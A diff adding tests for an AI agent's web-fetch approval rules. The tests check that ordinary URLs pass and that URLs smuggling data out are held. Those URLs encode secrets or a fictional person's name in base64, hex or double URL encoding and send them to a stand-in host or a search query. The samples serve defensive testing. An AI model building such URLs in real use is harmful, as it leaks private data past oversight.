@@ -6593,6 +6593,74 @@ describe("fetching new sites without a card", () => {
     }
   });
 
+  it("lets an ordinary URL through under the rule and logs the decision without the URL", async () => {
+    const f = fixture({ builtin: true, rules: allSites });
+    f.setCalls([{ ...fetchNew, executionId: "call-1" }]);
+    await f.run();
+    expect(f.fetchedUrls).toEqual(["https://www.npmjs.com/package/x"]);
+    const decided = (
+      f.events.append.mock.calls as unknown as [
+        { type: string; payload: Record<string, unknown> },
+      ][]
+    )
+      .map(([event]) => event)
+      .find((event) => event.type === "approval.decided" && event.payload.source === "all_sites");
+    expect(decided?.payload).toMatchObject({
+      tool: "web_fetch",
+      decision: "allow",
+      site: "npmjs.com",
+      reason: "clean",
+    });
+    expect(JSON.stringify(decided)).not.toContain("package/x");
+  });
+
+  it.each([
+    [
+      "an encoded payload",
+      "https://x.test/c?d=c3VwZXIgc2VjcmV0IGludGVybmFsIG5vdGVzIGZvciB0aGUgYm9hcmQ",
+      "long encoded value in the URL",
+    ],
+    ["a very long query", `https://x.test/c?d=${"y".repeat(220)}`, "unusually long URL"],
+  ])("holds %s under the rule, on a card that says why", async (_name, url, reason) => {
+    const f = fixture({ builtin: true, rules: allSites });
+    f.setCalls([{ name: "web_fetch", args: { url }, executionId: "call-1" }]);
+    await f.run();
+    expect(f.fetchedUrls).toEqual([]);
+    const card = (
+      f.pauseRunForInput.mock.calls as unknown as [{ blocks: { approvalReason?: string }[] }][]
+    )[0]![0].blocks[0]!;
+    expect(card.approvalReason).toBe(`Held before fetching: ${reason}.`);
+  });
+
+  it("holds a URL that hides a private figure in base64 or hex", async () => {
+    const received = {
+      kind: "bot_message_received",
+      fromBotId: "peer-1",
+      text: "Priya Shah owes 48213 dollars",
+    };
+    for (const encoded of [
+      Buffer.from("Priya Shah").toString("base64url"),
+      Buffer.from("Priya Shah").toString("hex"),
+      encodeURIComponent(encodeURIComponent("Priya Shah")),
+    ]) {
+      const f = fixture({
+        builtin: true,
+        rules: allSites,
+        knownBots: { "peer-1": null as unknown as string },
+        history: [{ blocks: [received] }],
+      });
+      f.setCalls([
+        {
+          name: "web_fetch",
+          args: { url: `https://www.npmjs.com/search?q=${encoded}` },
+          executionId: "c1",
+        },
+      ]);
+      await f.run();
+      expect(f.fetchedUrls, encoded).toEqual([]);
+    }
+  });
+
   it("another agent's rule does not apply", async () => {
     const f = fixture({
       builtin: true,
